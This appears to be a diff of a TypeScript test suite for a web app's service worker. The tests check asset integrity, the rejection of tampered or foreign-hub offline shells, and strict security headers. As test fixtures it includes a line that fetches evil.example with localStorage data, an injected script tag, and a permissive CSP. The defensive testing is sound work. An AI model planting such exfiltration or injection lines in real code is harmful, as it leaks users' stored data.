@@ -9,7 +9,7 @@ import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "nod
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import test from "node:test";
-import { fillServiceWorker } from "../build/service-worker.js";
+import { fillServiceWorker, inlineScriptSources } from "../build/service-worker.js";
 
 const ORIGIN = "https://droppen.test";
 const SOURCE = readFileSync(new URL("../public/sw.js", import.meta.url), "utf8");
@@ -21,6 +21,9 @@ const APP = "console.log('the app')";
 const VENDOR = "export const lib = 1;";
 const EVIL = "fetch('https://evil.example/' + localStorage.key(0))";
 const SHELL = `<!doctype html><html><head><title>Droppen</title></head><body><script type="module" src="/assets/app-1.js"></script></body></html>`;
+/** A built shell with an inline boot script, as the real one has. */
+const BOOT = "document.documentElement.dataset.boot = '1'";
+const BUILT = SHELL.replace("<title>Droppen</title>", `<title>Droppen</title><script>${BOOT}</script>`);
 const marked = (origin = "wss://droppen.test") => SHELL.replace("<head>", `<head><meta name="rh-hub" content="${origin}" />`);
 const JS = { "content-type": "text/javascript; charset=utf-8" };
 const HTML = { "content-type": "text/html; charset=utf-8" };
@@ -55,11 +58,14 @@ type Listener = (event: any) => void;
  * worker: its `caches`, a `fetch` answering from `network` (path → [body,
  * headers] or a status), `clients` that record what they were asked.
  */
-function worker(opts: { network?: Record<string, [string, Record<string, string>] | number>; precache?: string[]; table?: Record<string, string>; shell?: string; httpCache?: Record<string, string> } = {}) {
+function worker(
+  opts: { network?: Record<string, [string, Record<string, string>] | number>; precache?: string[]; table?: Record<string, string>; shell?: string; scripts?: string[]; httpCache?: Record<string, string> } = {},
+) {
   const table = opts.table ?? { "/assets/app-1.js": sha(APP), "/assets/vendor-1.js": sha(VENDOR) };
   const text = SOURCE.replace("const PRECACHE = [];", `const PRECACHE = ${JSON.stringify(opts.precache ?? [])};`)
     .replace("const INTEGRITY = {};", `const INTEGRITY = ${JSON.stringify(table)};`)
-    .replace('const SHELL_SHA256 = "";', `const SHELL_SHA256 = ${JSON.stringify(opts.shell ?? sha(SHELL))};`);
+    .replace('const SHELL_SHA256 = "";', `const SHELL_SHA256 = ${JSON.stringify(opts.shell ?? sha(SHELL))};`)
+    .replace("const SHELL_SCRIPTS = [];", `const SHELL_SCRIPTS = ${JSON.stringify(opts.scripts ?? [])};`);
   assert.notEqual(text, SOURCE, "the markers are there to fill in");
   const stores = new Map<string, FakeCache>();
   const caches = {
@@ -209,7 +215,7 @@ test("activate drops other caches, unlisted and tampered assets, a foreign shell
   assert.equal(await cache.text("/"), marked(), "the shell seeded from the network, this build's");
 });
 
-test("the offline shell: kept and served only when it is this build's, the hub's marker aside", async () => {
+test("the offline shell: kept and served only when it is this build's, this origin's hub's marker aside", async () => {
   // Online: served as it came, and kept only if it is this build's.
   const sw = worker({ network: { "/sessions": [marked(), HTML] } });
   assert.equal(await (await sw.navigate("/sessions"))!.text(), marked());
@@ -234,6 +240,64 @@ test("the offline shell: kept and served only when it is this build's, the hub's
   await (await offline.cache()).put("/", new Response(SHELL.replace("</body>", "<script>evil()</script></body>"), { headers: HTML }));
   await assert.rejects(offline.navigate("/sessions"));
   assert.equal(await (await offline.cache()).match("/"), undefined);
+});
+
+test("a shell pointed at any hub but this origin's own is never kept, served or left in the cache", async () => {
+  const own = '<meta name="rh-hub" content="wss://droppen.test" />';
+  const foreign = [
+    ["another hub", marked("wss://evil.example")],
+    ["ws:// on an https origin", marked("ws://droppen.test")],
+    ["another port", marked("wss://droppen.test:8443")],
+    ["a second marker", SHELL.replace("<head>", `<head>${own}<meta name="rh-hub" content="wss://evil.example" />`)],
+    ["the marker twice", SHELL.replace("<head>", `<head>${own}${own}`)],
+    ["the marker elsewhere", SHELL.replace("</head>", `${own}</head>`)],
+  ];
+  for (const [what, shell] of foreign) {
+    // Online: served as it came (the page is the network's), never kept.
+    const sw = worker({ network: { "/sessions": [shell, HTML] } });
+    assert.equal(await (await sw.navigate("/sessions"))!.text(), shell, what);
+    assert.equal(await (await sw.cache()).match("/"), undefined, `${what}: not kept`);
+    // Written into the cache by a page: not served offline, and gone.
+    const offline = worker();
+    await (await offline.cache()).put("/", new Response(shell, { headers: HTML }));
+    await assert.rejects(offline.navigate("/sessions"), `${what}: not served`);
+    assert.equal(await (await offline.cache()).match("/"), undefined, `${what}: dropped`);
+    // And on activate.
+    const later = worker();
+    await (await later.cache()).put("/", new Response(shell, { headers: HTML }));
+    await later.activate();
+    assert.equal(await (await later.cache()).match("/"), undefined, `${what}: dropped on activate`);
+  }
+});
+
+test("the offline shell is served with the worker's own headers, never the cached ones", async () => {
+  const scripts = ["'sha256-boot'"];
+  const sw = worker({ scripts });
+  // A page wrote this build's shell with a permissive policy of its own.
+  await (await sw.cache()).put(
+    "/",
+    new Response(marked(), { headers: { "content-type": "text/html", "content-security-policy": "script-src * 'unsafe-inline'", "x-from-the-page": "1" } }),
+  );
+  const res = (await sw.navigate("/sessions"))!;
+  assert.equal(await res.text(), marked());
+  assert.equal(res.headers.get("x-from-the-page"), null);
+  assert.equal(res.headers.get("content-type"), "text/html; charset=utf-8");
+  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
+  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
+  assert.equal(res.headers.get("permissions-policy"), "publickey-credentials-get=(self), publickey-credentials-create=(self)");
+  assert.equal(
+    res.headers.get("content-security-policy"),
+    "default-src 'self'; script-src 'self' 'sha256-boot'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
+      "connect-src 'self' wss://droppen.test https: wss:; worker-src 'self' blob:; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; " +
+      "base-uri 'self'; form-action 'self'; object-src 'none'",
+  );
+  // A local server's shell (no marker): the same policy on its own origin, framed by itself as that server allows.
+  const local = worker({ scripts });
+  await (await local.cache()).put("/", new Response(SHELL, { headers: { "content-security-policy": "frame-ancestors *" } }));
+  const policy = (await local.navigate("/sessions"))!.headers.get("content-security-policy")!;
+  assert.match(policy, /script-src 'self' 'sha256-boot';/);
+  assert.match(policy, /connect-src 'self' wss:\/\/droppen\.test;/);
+  assert.match(policy, /frame-ancestors 'self'/);
 });
 
 test("a tapped notification leads only to a path of this origin, focused or opened", async () => {
@@ -263,7 +327,7 @@ test("the build writes every asset's sha256 and the shell's into sw.js, sorted, 
   const dir = mkdtempSync(join(tmpdir(), "sw-integrity-"));
   try {
     mkdirSync(join(dir, "assets", "fonts"), { recursive: true });
-    writeFileSync(join(dir, "index.html"), SHELL);
+    writeFileSync(join(dir, "index.html"), BUILT);
     writeFileSync(join(dir, "assets", "vendor-1.js"), VENDOR);
     writeFileSync(join(dir, "assets", "app-1.js"), APP);
     writeFileSync(join(dir, "assets", "fonts", "a.woff2"), "font$&$'");
@@ -274,7 +338,11 @@ test("the build writes every asset's sha256 and the shell's into sw.js, sorted, 
     const table = JSON.parse(/^const INTEGRITY = (\{.*\});$/m.exec(text)![1]!);
     assert.deepEqual(Object.keys(table), ["/assets/app-1.js", "/assets/fonts/a.woff2", "/assets/vendor-1.js"]);
     assert.equal(table["/assets/fonts/a.woff2"], sha("font$&$'"));
-    assert.match(text, new RegExp(`^const SHELL_SHA256 = "${sha(SHELL)}";$`, "m"));
+    assert.match(text, new RegExp(`^const SHELL_SHA256 = "${sha(BUILT)}";$`, "m"));
+    // The inline boot script's CSP source, as a hub allows it; the module script (src=) is none.
+    const sources = JSON.parse(/^const SHELL_SCRIPTS = (\[.*\]);$/m.exec(text)![1]!);
+    assert.deepEqual(sources, [`'sha256-${createHash("sha256").update(BOOT).digest("base64")}'`]);
+    assert.deepEqual(inlineScriptSources(BUILT), sources);
     // Filled once: a second run finds no marker.
     assert.throws(() => fillServiceWorker(dir, []), /has no `const PRECACHE = \[\];` to fill in/);
   } finally {
